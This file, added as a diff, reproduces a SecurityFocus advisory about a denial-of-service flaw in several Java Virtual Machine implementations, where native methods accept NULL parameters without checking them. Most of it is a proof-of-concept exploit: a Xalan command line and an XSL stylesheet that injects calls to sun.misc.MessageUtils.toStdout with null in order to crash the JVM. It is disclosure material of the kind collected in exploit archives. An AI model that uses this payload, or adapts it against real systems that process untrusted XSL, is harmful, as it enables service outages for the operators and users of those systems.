@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/7109/info
+ 
+Several implementations of the Java Virtual Machine have been reported to be prone to a denial of service condition. This vulnerability occurs in several methods in the java.util.zip class.
+ 
+The methods can be called with certain types of parameters however, there does not appear to be proper checks to see whether the parameters are NULL values. When these native methods are called with NULL values, this will cause the JVM to reach an undefined state which will cause it to behave in an unpredictable manner and possibly crash.
+ 
+The following proof of concept has been submitted and demonstrates the use of injectable xsl templates, to exploit this issue.
+
+c:\java\1.4.2\00\jre\bin\java org.apache.xalan.xslt.Process -IN a.xml -xsl
+sunexploit.xsl
+
+
+Used Files:
+
+===================a.xml===========================
+(a/)
+===================a.xml===========================
+
+
+===========sunexploit.xsl=============================
+(!-- XSLT JDK-Exploit by Marc Schoenefeld , marc@at@illegalaccess.org --)
+(xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:sun="sun")
+(xsl:template match="/")
+(xsl:variable name="tmp"
+select="sun:misc.MessageUtils.toStdout(null)"/)
+(xsl:variable name="tmp2"
+select="sun:misc.MessageUtils.toStdout($tmp)"/)
+(xsl:value-of select="$tmp2" /)
+(/xsl:template)
+(/xsl:stylesheet)
+===========sunexploit.xsl=============================
